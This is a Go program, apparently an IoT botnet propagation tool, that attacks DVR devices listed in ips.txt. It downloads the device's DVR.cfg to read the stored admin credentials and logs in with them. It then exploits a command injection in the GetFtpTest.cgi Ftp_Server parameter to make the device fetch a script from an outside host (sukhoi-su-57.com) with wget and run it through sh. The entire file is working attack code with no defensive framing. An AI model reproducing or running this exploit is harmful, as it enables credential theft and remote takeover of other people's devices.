/* 

2K Taiwan

*/ 


package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
	"encoding/base64"
)

func GetCredentials(ip string, port string) (string, string) {
	url := fmt.Sprintf("http://%s:%s/DVR.cfg", ip, port)

	// Make an HTTP GET request to the URL
	response, err := http.Get(url)
	if err != nil {
		fmt.Println("Error making the request:", err)
		return "", ""
	}
	defer response.Body.Close()

	// Read the response body
	content, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading the response body:", err)
		return "", ""
	}

	// Convert the response body to a string
	fileContent := string(content)

	// Split the file content into lines
	lines := strings.Split(fileContent, "\n")

	// Search for the desired lines containing username and password
	username := ""
	password := ""

	for _, line := range lines {
		if strings.HasPrefix(line, "USER1_USERNAME=") {
			username = strings.TrimPrefix(line, "USER1_USERNAME=")
		}
		if strings.HasPrefix(line, "USER1_PASSWORD=") {
			password = strings.TrimPrefix(line, "USER1_PASSWORD=")
		}
	}

	return username, password
}

func Login(ip string, port string, url string) (string, string) {
	username, password := GetCredentials(ip, port)

	// Create a new HTTP client
	client := &http.Client{}

	// Create a new request with basic authentication
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating the request:", err)
		return "", ""
	}
	req.SetBasicAuth(username, password)

	// Set the headers for the login request
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending the request:", err)
		return "", ""
	}
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode == http.StatusOK {
		fmt.Println("Login successful")
		return username, password
	} else {
		fmt.Println("Login failed. Status code:", resp.StatusCode)
		return "", ""
	}
}

func SendPayload(ip string, port string, username string, password string) {
	url := fmt.Sprintf("http://%s:%s/GetFtpTest.cgi?Ftp_Server=`wget${IFS}http://sukhoi-su-57.com/scripts/uAwh970n${IFS}-O-|sh`&Username=a&Password=a&FtpPort=21&Path=/ALARM/", ip, port)

	// Create a new HTTP client
	client := &http.Client{}

	// Create a new request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating the request:", err)
		return
	}

	// Set the headers for the payload request
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Authorization", "Basic "+basicAuth(username, password))
	req.Header.Set("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Referer", fmt.Sprintf("http://%s:%s/network.html", ip, port))
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending the request:", err)
		return
	}
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode == http.StatusOK {
		fmt.Println("Payload sent successfully")
	} else {
		fmt.Println("Failed to send payload. Status code:", resp.StatusCode)
	}
	//Sleep for 10 seconds to let the request go through
		time.Sleep(10 * time.Second)
}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

func main() {
	// Check if the number of command-line arguments is correct
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run h.go PORT")
		return
	}

	port := os.Args[1]

	// Read the IP address from ips.txt
	ipBytes, err := ioutil.ReadFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading ips.txt:", err)
		return
	}

	ip := strings.TrimSpace(string(ipBytes))

	url := fmt.Sprintf("http://%s:%s/network.html", ip, port)
	username, password := Login(ip, port, url)

	if username != "" && password != "" {
		SendPayload(ip, port, username, password)
	}
}

